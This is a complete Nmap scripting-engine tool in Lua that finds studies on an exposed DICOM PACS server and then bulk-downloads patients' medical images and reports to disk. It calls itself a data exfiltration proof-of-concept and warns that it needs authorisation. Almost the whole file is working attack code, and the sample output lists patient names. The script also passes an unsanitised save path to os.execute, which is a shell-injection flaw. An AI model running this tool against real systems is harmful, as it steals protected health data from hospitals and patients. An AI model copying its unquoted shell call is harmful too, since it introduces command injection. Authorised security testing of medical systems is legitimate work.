description = [[
DICOM C-GET image retrieval and data exfiltration proof-of-concept.

Downloads DICOM instances (images, reports, structured reports) from a PACS
via C-GET, saving them to disk as .dcm files. This demonstrates the real-world
impact of an exposed DICOM Q/R service: not just that patient data is visible
(as shown by dicom-cfind-ls), but that it can be fully exfiltrated.

The workflow mirrors what a legitimate DICOM SCU does:
  1. C-FIND at STUDY level to discover studies (or use a known
  StudyInstanceUID)
  2. C-GET at STUDY/SERIES/IMAGE level to retrieve instances
  3. For each instance, the SCP sends a C-STORE sub-operation on the same
     association; this script acts as a mini-SCP, receiving and saving each
     file

C-GET is preferred over C-MOVE because it works on the same association --
no need for the target to connect back to us, and no need for our AE to be
registered in the PACS modality list.

Downloaded files retain the original DICOM dataset bytes and are valid .dcm
files (with a Part 10 header prepended) that can be opened in any DICOM
viewer (Horos, RadiAnt, MicroDicom, etc.).

WARNING: This is an intrusive script. It downloads actual patient data
(PHI/PII)
from the target PACS. Only use against systems for which you have explicit
written authorisation. Downloaded files must be handled according to applicable
data protection regulations (HIPAA, GDPR, etc.).

Requires the dicom.lua library (place in nselib/ or same directory).
]]

---
-- @usage
-- nmap -p 4242 --script dicom-get \
--   --script-args 'dicom-get.called_ae=ORTHANC,dicom-get.calling_ae=LAUNCHER,dicom-get.save=/tmp/exfil' <target>
--
-- @usage
-- # Retrieve a specific study by UID
-- nmap -p 4242 --script dicom-get \
--   --script-args 'dicom-get.called_ae=ORTHANC,dicom-get.study_uid=1.2.3.4.5,dicom-get.save=/tmp/exfil' <target>
--
-- @usage
-- # Retrieve only 3 studies, up to 5 instances each
-- nmap -p 4242 --script dicom-get \
--   --script-args 'dicom-get.called_ae=ORTHANC,dicom-get.max_studies=3,dicom-get.max_instances=5,dicom-get.save=/tmp/exfil' <target>
--
-- @args dicom-get.called_ae       Target AE Title (default: "ANY-SCP")
-- @args dicom-get.calling_ae      Our AE Title (default: "NMAP-GET")
-- @args dicom-get.save            Directory to save retrieved .dcm files
-- (REQUIRED)
-- @args dicom-get.study_uid       Specific StudyInstanceUID to retrieve
-- (default: discover via C-FIND)
-- @args dicom-get.series_uid      Specific SeriesInstanceUID to retrieve
-- (requires study_uid)
-- @args dicom-get.patient_name    Patient name filter for C-FIND discovery
-- (default: "*")
-- @args dicom-get.patient_id      Patient ID filter for C-FIND discovery
-- (default: "")
-- @args dicom-get.modality        Modality filter for C-FIND discovery
-- (default: "")
-- @args dicom-get.level           Retrieval level: "STUDY", "SERIES", "IMAGE"
-- (default: "STUDY")
-- @args dicom-get.max_studies     Max studies to retrieve (default: 5)
-- @args dicom-get.max_instances   Max instances per study (default: 50)
-- @args dicom-get.timeout         DIMSE timeout in seconds (default: 30)
-- @args dicom-get.max_pdu         Max PDU Length (default: 16384)
-- @args dicom-get.info_model      Q/R information model: "study" or "patient"
-- (default: "study")
-- @args dicom-get.part10          Prepend DICOM Part 10 header to saved files
-- (default: true)
--
-- @output
-- PORT     STATE SERVICE
-- 4242/tcp open  dicom
-- | dicom-get:
-- |   Target AE: ORTHANC  Calling AE: LAUNCHER
-- |   Studies discovered: 2 (via C-FIND)
-- |   Retrieved:
-- |     Study 1.2.826...514 - Doe^John (PT_STRATIGOS_EC2_001)
-- |       Saved: 101 instances (12.4 MB)
-- |     Study 1.2.826...514 - Doe, John (1)
-- |       Saved: 101 instances (12.4 MB)
-- |   Total: 202 instances, 24.8 MB saved to /tmp/exfil
-- |   WARNING: Patient data downloaded without authentication
-- |_
---

author   = "Paulino Calderon <paulino@calderonpale.com>"
license  = "Same as Nmap -- See https://nmap.org/book/man-legal.html"
categories = {"discovery", "intrusive"}

local shortport = require "shortport"
local stdnse    = require "stdnse"
local nmap      = require "nmap"
local string    = require "string"
local math      = require "math"
local dicom     = require "dicom"

portrule = shortport.port_or_service({104, 2762, 11112, 4242}, "dicom", "tcp",
    "open")

-----------------------------------------------------------------------
-- HELPERS
-----------------------------------------------------------------------

local function get_arg(key, default)
  return stdnse.get_script_args("dicom-get." .. key) or default
end

--- Format bytes into human-readable size.
local function fmt_bytes(n)
  if n < 1024 then return string.format("%d B", n) end
  if n < 1024 * 1024 then return string.format("%.1f KB", n / 1024) end
  return string.format("%.1f MB", n / (1024 * 1024))
end

--- Build a DICOM Part 10 file header (preamble + DICM + File Meta).
-- @param sop_class     SOP Class UID
-- @param sop_instance  SOP Instance UID
-- @param ts_uid        Transfer Syntax UID
-- @return Part 10 header bytes
local function build_part10_header(sop_class, sop_instance, ts_uid)
  ts_uid = ts_uid or dicom.TRANSFER_SYNTAX.EXPLICIT_LE

  -- File Meta is always Explicit VR Little Endian
  local function meta_elem(group, elem, vr, val)
    local tag = string.pack("<I2 I2", group, elem)
    if vr == "OB" or vr == "OW" or vr == "SQ" or vr == "UN" then
      local padded = val
      if #padded % 2 ~= 0 then padded = padded .. "\x00" end
      return tag .. vr .. "\x00\x00" .. string.pack("<I4", #padded) .. padded
    else
      local padded = val
      if (vr == "UI" or vr == "SH" or vr == "LO") and #padded % 2 ~= 0 then
        padded = padded .. "\x00"
      end
      return tag .. vr .. string.pack("<I2", #padded) .. padded
    end
  end

  -- Build group 0002 elements (excluding 0002,0000 GroupLength)
  local meta = ""
  meta = meta .. meta_elem(0x0002, 0x0001, "OB",
      "\x00\x01") -- FileMetaInformationVersion
  meta = meta .. meta_elem(0x0002, 0x0002, "UI",
      sop_class) -- MediaStorageSOPClassUID
  meta = meta .. meta_elem(0x0002, 0x0003, "UI",
      sop_instance) -- MediaStorageSOPInstanceUID
  meta = meta .. meta_elem(0x0002, 0x0010, "UI", ts_uid) -- TransferSyntaxUID
  meta = meta .. meta_elem(0x0002, 0x0012, "UI",
      dicom.IMPL_CLASS_UID) -- ImplementationClassUID
  meta = meta .. meta_elem(0x0002, 0x0013, "SH",
      dicom.IMPL_VERSION) -- ImplementationVersionName

  -- GroupLength (0002,0000) = total length of the rest of group 0002
  local group_len = meta_elem(0x0002, 0x0000, "UL", string.pack("<I4", #meta))

  -- 128-byte preamble + "DICM" + File Meta
  return string.rep("\x00", 128) .. "DICM" .. group_len .. meta
end

-----------------------------------------------------------------------
-- C-FIND DISCOVERY
-----------------------------------------------------------------------

--- Discover studies via C-FIND.
-- @return list of {study_uid, patient_name, patient_id, modality, description}
local function discover_studies(host, port, called_ae, calling_ae, find_sop,
                                 pat_name, pat_id, modality, max_pdu,
                                 timeout_s, max_studies)
  local ok, sock, pctxs, server_max_pdu = dicom.do_associate(
    host, port, called_ae, calling_ae, {find_sop}, max_pdu, timeout_s)
  if not ok then return nil, sock end

  local pctx_id = dicom.pick_accepted_pctx(pctxs)
  if not pctx_id then
    dicom.do_release(sock, 3)
    return nil, "No accepted presentation context for C-FIND"
  end

  local ts = dicom.get_accepted_ts(pctxs, pctx_id)
      or dicom.TRANSFER_SYNTAX.EXPLICIT_LE
  local eff_max = math.min(server_max_pdu or max_pdu, max_pdu)

  -- Build query
  local query_tags = {
    {group=0x0010, elem=0x0010, vr="PN", value=pat_name},   -- PatientName
    {group=0x0010, elem=0x0020, vr="LO", value=pat_id},     -- PatientID
    {group=0x0020, elem=0x000D, vr="UI", value=""},
        -- StudyInstanceUID (return key)
    {group=0x0008, elem=0x0061, vr="CS", value=modality}, -- ModalitiesInStudy
    {group=0x0008, elem=0x1030, vr="LO", value=""}, -- StudyDescription
  }

  local cmd = dicom.build_cfind_rq(1, find_sop)
  local ds  = dicom.build_cfind_dataset("STUDY", query_tags, ts)
  dicom.send_dimse(sock, pctx_id, cmd, ds, eff_max)

  -- Collect responses
  local studies = {}
  local carry = ""

  while true do
    local pdu_type, cmd_elems, resp_ds, raw
    pdu_type, cmd_elems, resp_ds, raw, carry = dicom.recv_dimse(sock,
        timeout_s, carry)

    if not pdu_type then break end
    if pdu_type == dicom.PDU_CODES.ABORT then break end
    if pdu_type ~= dicom.PDU_CODES.DATA then break end

    local status = 0xFFFF
    if cmd_elems and cmd_elems["0000,0900"] then
      status = cmd_elems["0000,0900"].value
    end

    if status == dicom.STATUS.PENDING
        or status == dicom.STATUS.PENDING_WARN then
      if #resp_ds > 0 then
        local elems = dicom.parse_dataset(resp_ds, ts)
        if elems then
          studies[#studies + 1] = {
            study_uid    = elems["0020,000D"] or "",
            patient_name = elems["0010,0010"] or "",
            patient_id   = elems["0010,0020"] or "",
            modality     = elems["0008,0061"] or "",
            description  = elems["0008,1030"] or "",
          }
          if #studies >= max_studies then
            stdnse.debug1("C-FIND: max_studies (%d) reached", max_studies)
            break
          end
        end
      end
    elseif status == dicom.STATUS.SUCCESS then
      break
    else
      break
    end
  end

  dicom.do_release(sock, 3)
  return studies
end

-----------------------------------------------------------------------
-- C-GET RETRIEVAL
-----------------------------------------------------------------------

--- Retrieve instances via C-GET for a single study/series.
-- The SCP sends C-STORE sub-operations on the same association.
-- This script acts as a mini-SCP: receive each C-STORE, save to disk, send
-- C-STORE-RSP.
--
-- @param host, port         Nmap host/port objects
-- @param called_ae          Called AE Title
-- @param calling_ae         Calling AE Title
-- @param get_sop            Q/R GET SOP Class UID
-- @param query_tags         Tags identifying what to retrieve
-- @param level              Q/R level ("STUDY", "SERIES", "IMAGE")
-- @param max_pdu            Max PDU length
-- @param timeout_s          Timeout in seconds
-- @param save_dir           Directory to save .dcm files
-- @param max_instances      Max instances to save (0 = unlimited)
-- @param add_part10         Prepend Part 10 header
-- @return saved_count, total_bytes, error_count, file_list
local function do_cget(host, port, called_ae, calling_ae, get_sop,
                       query_tags, level, max_pdu, timeout_s, save_dir,
                       max_instances, add_part10)
  -- We need to propose both the C-GET SOP class AND storage SOP classes
  -- that the SCP will use for C-STORE sub-operations.
  -- Propose a broad set of storage classes so we can receive any modality.
  local storage_sops = {
    dicom.SOP_CLASS.CT_IMAGE_STORAGE,
    dicom.SOP_CLASS.MR_IMAGE_STORAGE,
    dicom.SOP_CLASS.SECONDARY_CAPTURE,
    dicom.SOP_CLASS.ENHANCED_CT_STORAGE,
    dicom.SOP_CLASS.PET_IMAGE_STORAGE,
    dicom.SOP_CLASS.RT_DOSE_STORAGE,
    dicom.SOP_CLASS.RT_PLAN_STORAGE,
    "1.2.840.10008.5.1.4.1.1.6.1",    -- US Image Storage
    "1.2.840.10008.5.1.4.1.1.1",      -- CR Image Storage
    "1.2.840.10008.5.1.4.1.1.1.1",    -- Digital X-Ray (DX)
    "1.2.840.10008.5.1.4.1.1.1.2",    -- Digital Mammography
    "1.2.840.10008.5.1.4.1.1.20",     -- NM Image Storage
    "1.2.840.10008.5.1.4.1.1.12.1",   -- X-Ray Angiographic
    "1.2.840.10008.5.1.4.1.1.4.1",    -- Enhanced MR
    "1.2.840.10008.5.1.4.1.1.128.1",  -- Enhanced PET
    "1.2.840.10008.5.1.4.1.1.104.1",  -- Encapsulated PDF
    "1.2.840.10008.5.1.4.1.1.88.11",  -- Basic Text SR
    "1.2.840.10008.5.1.4.1.1.88.22",  -- Enhanced SR
    "1.2.840.10008.5.1.4.1.1.88.33",  -- Comprehensive SR
    "1.2.840.10008.5.1.4.1.1.481.1",  -- RT Image
    "1.2.840.10008.5.1.4.1.1.481.3",  -- RT Structure Set
    "1.2.840.10008.5.1.4.1.1.7.1",    -- Multi-frame SC (Byte)
    "1.2.840.10008.5.1.4.1.1.7.2",    -- Multi-frame SC (Word)
    "1.2.840.10008.5.1.4.1.1.7.3",    -- Multi-frame SC (True Color)
    "1.2.840.10008.5.1.4.1.1.7.4",    -- Multi-frame SC (Grayscale)
  }

  -- Build combined SOP list: C-GET SOP first, then storage SOPs
  local all_sops = {get_sop}
  -- Deduplicate
  local seen = {[get_sop] = true}
  for _, sop in ipairs(storage_sops) do
    if not seen[sop] then
      seen[sop] = true
      all_sops[#all_sops + 1] = sop
    end
  end

  -- Request SCP/SCU role reversal on the storage SOP classes so the server
  -- will push retrieved instances back to us as C-STORE sub-operations
  -- (mandatory for C-GET, PS3.7 §D.3.3.4).
  local roles = {}
  for _, sop in ipairs(storage_sops) do
    roles[#roles + 1] = { uid = sop, scu = false, scp = true }
  end

  local ok, sock, pctxs, server_max_pdu = dicom.do_associate(
    host, port, called_ae, calling_ae, all_sops, max_pdu, timeout_s, nil,
        roles)
  if not ok then
    return 0, 0, 0, {}, tostring(sock)
  end

  local pctx_id = dicom.pick_accepted_pctx(pctxs)
  if not pctx_id then
    dicom.do_release(sock, 3)
    return 0, 0, 0, {}, "No accepted presentation context for C-GET"
  end

  local ts = dicom.get_accepted_ts(pctxs, pctx_id)
      or dicom.TRANSFER_SYNTAX.EXPLICIT_LE
  local eff_max = math.min(server_max_pdu or max_pdu, max_pdu)

  -- Build and send C-GET-RQ
  local cmd_bytes = dicom.build_cget_rq(1, get_sop)
  local ds_bytes  = dicom.build_cget_dataset(level, query_tags, ts)
  dicom.send_dimse(sock, pctx_id, cmd_bytes, ds_bytes, eff_max)

  -- Receive loop: handle C-STORE sub-operations from the SCP
  local saved = 0
  local errors = 0
  local total_bytes = 0
  local files = {}
  local carry = ""
  local limit_reached = false

  while true do
    local pdu_type, cmd_elems, resp_ds, raw, in_pctx
    pdu_type, cmd_elems, resp_ds, raw, carry, in_pctx =
      dicom.recv_dimse(sock, timeout_s, carry)
    -- Context to reply on for C-STORE sub-operations: the one the sub-op
    -- arrived on (falls back to the C-GET context if unknown).
    local store_pctx = in_pctx or pctx_id

    if not pdu_type then
      stdnse.debug1("C-GET recv error: %s", tostring(raw))
      break
    end
    if pdu_type == dicom.PDU_CODES.ABORT then
      stdnse.debug1("C-GET: received A-ABORT")
      break
    end
    if pdu_type ~= dicom.PDU_CODES.DATA then
      stdnse.debug1("C-GET: unexpected PDU 0x%02X", pdu_type)
      break
    end

    local cmd_field = 0
    if cmd_elems and cmd_elems["0000,0100"] then
      cmd_field = cmd_elems["0000,0100"].value
    end

    if cmd_field == dicom.COMMAND_FIELD.C_STORE_RQ then
      -- Incoming C-STORE sub-operation
      local sop_class = ""
      if cmd_elems["0000,0002"] then
        sop_class = tostring(cmd_elems["0000,0002"].value):gsub("%z",
            ""):gsub("%s+$", "")
      end
      local sop_instance = ""
      if cmd_elems["0000,1000"] then
        sop_instance = tostring(cmd_elems["0000,1000"].value):gsub("%z",
            ""):gsub("%s+$", "")
      end
      if sop_instance == "" then sop_instance = dicom.generate_fake_uid() end
      local msg_id_rsp = 1
      if cmd_elems["0000,0110"] then
        msg_id_rsp = cmd_elems["0000,0110"].value
      end

      -- Determine the transfer syntax used for this C-STORE
      -- The SCP uses the negotiated TS for the presentation context it chose
      local store_ts = dicom.get_accepted_ts(pctxs, store_pctx) or ts

      -- Save file
      if max_instances > 0 and saved >= max_instances then
        -- We've reached our limit; still send RSP to be polite
        if not limit_reached then
          stdnse.debug1("C-GET: max_instances (%d) reached, skipping saves",
              max_instances)
          limit_reached = true
        end
        local rsp_cmd = dicom.build_cstore_rsp(msg_id_rsp, sop_class,
            sop_instance)
        dicom.send_dimse(sock, store_pctx, rsp_cmd, nil, eff_max)
      else
        local filename = sop_instance:gsub("[^%w%.]", "_") .. ".dcm"
        local filepath = save_dir:gsub("[/\\]+$", "") .. "/" .. filename

        local file_data
        if add_part10 and resp_ds and #resp_ds > 0 then
          file_data = build_part10_header(sop_class, sop_instance, store_ts)
              .. resp_ds
        else
          file_data = resp_ds or ""
        end

        local wok, werr = dicom.write_file(filepath, file_data)
        if wok then
          saved = saved + 1
          total_bytes = total_bytes + #file_data
          files[#files + 1] = {
            filename     = filename,
            sop_class    = sop_class,
            sop_instance = sop_instance,
            size         = #file_data,
          }
          stdnse.debug1("C-GET: saved %s (%s)", filename,
              fmt_bytes(#file_data))
        else
          errors = errors + 1
          stdnse.debug1("C-GET: save failed: %s", tostring(werr))
        end

        -- Send C-STORE-RSP (SUCCESS)
        local rsp_cmd = dicom.build_cstore_rsp(msg_id_rsp, sop_class,
            sop_instance)
        dicom.send_dimse(sock, store_pctx, rsp_cmd, nil, eff_max)
      end

    elseif cmd_field == dicom.COMMAND_FIELD.C_GET_RSP then
      -- C-GET-RSP: check status
      local cget_status = 0xFFFF
      if cmd_elems["0000,0900"] then
        cget_status = cmd_elems["0000,0900"].value
      end

      -- Extract progress counters if available
      local remaining = 0
      local completed = 0
      if cmd_elems["0000,1020"] then
        remaining = cmd_elems["0000,1020"].value
      end
      if cmd_elems["0000,1021"] then
        completed = cmd_elems["0000,1021"].value
      end

      if cget_status == dicom.STATUS.PENDING
          or cget_status == dicom.STATUS.PENDING_WARN then
        stdnse.debug2("C-GET: progress %d completed, %d remaining", completed,
            remaining)
      else
        stdnse.debug1("C-GET: final status 0x%04X (%d completed)", cget_status,
            completed)
        break
      end
    else
      stdnse.debug1("C-GET: unexpected command field 0x%04X", cmd_field)
    end
  end

  dicom.do_release(sock, 3)
  return saved, total_bytes, errors, files
end

-----------------------------------------------------------------------
-- MAIN ACTION
-----------------------------------------------------------------------

action = function(host, port)
  local called_ae      = get_arg("called_ae",      "ANY-SCP")
  local calling_ae     = get_arg("calling_ae",     "NMAP-GET")
  local save_dir       = get_arg("save",            nil)
  local study_uid      = get_arg("study_uid",       nil)
  local series_uid     = get_arg("series_uid",      nil)
  local pat_name       = get_arg("patient_name",   "*")
  local pat_id         = get_arg("patient_id",     "")
  local modality       = get_arg("modality",       "")
  local level          = get_arg("level",          "STUDY"):upper()
  local max_studies    = tonumber(get_arg("max_studies",    "5"))
  local max_instances  = tonumber(get_arg("max_instances",  "50"))
  local timeout_s      = tonumber(get_arg("timeout",       "30"))
  local max_pdu        = tonumber(get_arg("max_pdu",       "16384"))
  local info_model     = get_arg("info_model",     "study"):lower()
  local add_part10     = (get_arg("part10", "true")):lower() ~= "false"

  local out = stdnse.output_table()

  if not save_dir then
    out["Error"] = "dicom-get.save is required. Specify a directory to save" ..
                   " retrieved .dcm files."
    return out
  end

  -- Create save directory
  os.execute("mkdir -p " .. save_dir .. " 2>/dev/null")
  os.execute("mkdir " .. save_dir .. " 2>nul")

  out["Target AE"]  = called_ae
  out["Calling AE"] = calling_ae

  -- Select Q/R SOP classes
  local find_sop, get_sop
  if info_model == "patient" then
    find_sop = dicom.SOP_CLASS.PATIENT_ROOT_QR_FIND
    get_sop  = dicom.SOP_CLASS.PATIENT_ROOT_QR_GET
  else
    find_sop = dicom.SOP_CLASS.STUDY_ROOT_QR_FIND
    get_sop  = dicom.SOP_CLASS.STUDY_ROOT_QR_GET
  end

  -- == Phase 1: Discover studies (or use provided UID) ==
  local studies = {}

  if study_uid then
    -- User provided a specific study UID
    studies[#studies + 1] = {
      study_uid    = study_uid,
      patient_name = "(specified)",
      patient_id   = "",
    }
    out["Studies"] = "1 (specified via study_uid)"
  else
    -- Discover via C-FIND
    local found, err = discover_studies(host, port, called_ae, calling_ae,
      find_sop, pat_name, pat_id, modality, max_pdu, timeout_s, max_studies)

    if not found then
      out["Error"] = "C-FIND discovery failed: " .. tostring(err)
      return out
    end

    if #found == 0 then
      out["Result"] = "No studies found (server may require specific AE" ..
                      " title or filter)"
      return out
    end

    studies = found
    out["Studies discovered"] = string.format("%d (via C-FIND)", #studies)
  end

  -- == Phase 2: Retrieve each study via C-GET ==
  local results = {}
  local grand_total_saved = 0
  local grand_total_bytes = 0
  local grand_total_errors = 0

  for _, study in ipairs(studies) do
    if study.study_uid == "" then goto next_study end

    -- Build query tags for C-GET
    local query_tags = {
      {group=0x0020, elem=0x000D, vr="UI", value=study.study_uid},
    }
    local get_level = level

    -- If series_uid is specified, add it and set level to SERIES
    if series_uid and series_uid ~= "" then
      query_tags[#query_tags + 1] =
        {group=0x0020, elem=0x000E, vr="UI", value=series_uid}
      get_level = "SERIES"
    end

    stdnse.debug1("C-GET: retrieving study %s (%s)",
      study.study_uid, study.patient_name)

    local saved, total_bytes, errs, files = do_cget(
      host, port, called_ae, calling_ae, get_sop,
      query_tags, get_level, max_pdu, timeout_s, save_dir,
      max_instances, add_part10)

    results[#results + 1] = {
      study_uid    = study.study_uid,
      patient_name = study.patient_name,
      patient_id   = study.patient_id,
      saved        = saved,
      errors       = errs,
      total_bytes  = total_bytes,
      files        = files,
    }

    grand_total_saved  = grand_total_saved  + saved
    grand_total_bytes  = grand_total_bytes  + total_bytes
    grand_total_errors = grand_total_errors + errs

    ::next_study::
  end

  -- == Output ==
  local study_lines = {}
  for _, r in ipairs(results) do
    local short_uid = r.study_uid
    if #short_uid > 40 then
      short_uid = short_uid:sub(1, 20) .. "..." .. short_uid:sub(-16)
    end

    local line = string.format("Study %s - %s", short_uid, r.patient_name)
    if r.patient_id ~= "" then
      line = line .. string.format(" (%s)", r.patient_id)
    end
    study_lines[#study_lines + 1] = line

    if r.saved > 0 then
      study_lines[#study_lines + 1] = string.format(
        "  Saved: %d instances (%s)", r.saved, fmt_bytes(r.total_bytes))
    end
    if r.errors > 0 then
      study_lines[#study_lines + 1] = string.format(
        "  Errors: %d instances failed to save", r.errors)
    end
    if r.saved == 0 and r.errors == 0 then
      study_lines[#study_lines + 1] = "  No instances retrieved (C-GET may" ..
                                      " not be supported)"
    end
  end
  out["Retrieved"] = study_lines

  out["Total"] = string.format("%d instances, %s saved to %s",
    grand_total_saved, fmt_bytes(grand_total_bytes), save_dir)

  if grand_total_errors > 0 then
    out["Errors"] = string.format("%d instances failed", grand_total_errors)
  end

  if grand_total_saved > 0 then
    out["WARNING"] = "Patient data (PHI) downloaded without authentication"
  elseif #studies > 0 then
    out["Note"] = "Studies found but no instances retrieved. " ..
      "Server may not support C-GET (try C-MOVE instead), " ..
      "or storage SOP classes were rejected."
  end

  nmap.set_port_state(host, port, "open")
  port.version.name = "dicom"
  port.version.product = "DICOM SCP"
  nmap.set_port_version(host, port, "hardmatched")

  return out
end
